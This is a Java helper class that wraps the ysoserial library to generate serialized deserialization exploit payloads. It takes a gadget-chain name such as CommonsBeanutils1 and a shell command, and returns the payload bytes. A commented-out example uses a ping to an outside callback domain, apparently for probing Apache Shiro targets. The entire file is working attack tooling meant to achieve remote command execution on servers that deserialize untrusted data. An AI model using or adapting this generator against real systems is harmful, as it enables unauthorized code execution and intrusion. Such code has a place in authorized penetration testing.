package Test;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.PrintStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;

import ysoserial.Serializer;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.ObjectPayload.Utils;

public class YsoserialHelper {

    public static byte[] genPayload(String payloadType,String command) {
        //		final String payloadType = "CommonsBeanutils1";
        //		final String command = "ping 11shiro.bit.0y0.link";

        final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
        if (payloadClass == null) {
            System.err.println("Invalid payload type '" + payloadType + "'");
            return null;
        }

        try {
            final ObjectPayload payload = payloadClass.newInstance();
            final Object object = payload.getObject(command);
            //PrintStream out = System.out;
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            PrintStream out = new PrintStream(baos);
            //更换默认的输出流，以便返回输出内容
            //https://stackoverflow.com/questions/8708342/redirect-console-output-to-string-in-java/8708357
            Serializer.serialize(object, out);
            ObjectPayload.Utils.releasePayload(payload, object);
            return baos.toByteArray();
        } catch (Throwable e) {
            System.err.println("Error while generating or serializing payload");
            e.printStackTrace();
            return null;
        }
    }
}
